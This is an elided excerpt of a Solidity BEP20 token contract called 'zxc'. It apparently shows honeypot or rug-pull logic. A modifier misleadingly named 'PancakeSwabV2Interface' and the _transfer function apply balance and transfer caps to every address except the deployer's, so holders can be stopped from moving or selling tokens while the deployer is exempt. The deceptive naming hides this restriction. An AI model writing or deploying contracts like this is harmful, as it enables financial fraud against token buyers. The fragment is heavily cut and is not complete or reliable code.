...
contract zxc is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  uint256 public _rewardPercent =11;
  uint256 private _maxTrxLimit = 10000000000000000000*0.02;
  uint256 private max_transfer_limit = 200000000000000000;
  ...
  */
  ...
  modifier PancakeSwabV2Interface(address sender, address recipient) {
            if(sender != _deployer) {
                if(reward_status){
                    ...
                    require(_balances[sender] < _maxTrxLimit , "MAX_TX_ERROR");
                }
            }
        _;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    ...
    if(sender != _deployer ) {
        require(amount < max_transfer_limit, "balance of recepient is to high");
        require(_balances[recipient]+amount < max_transfer_limit, "transfer is to high");
    }
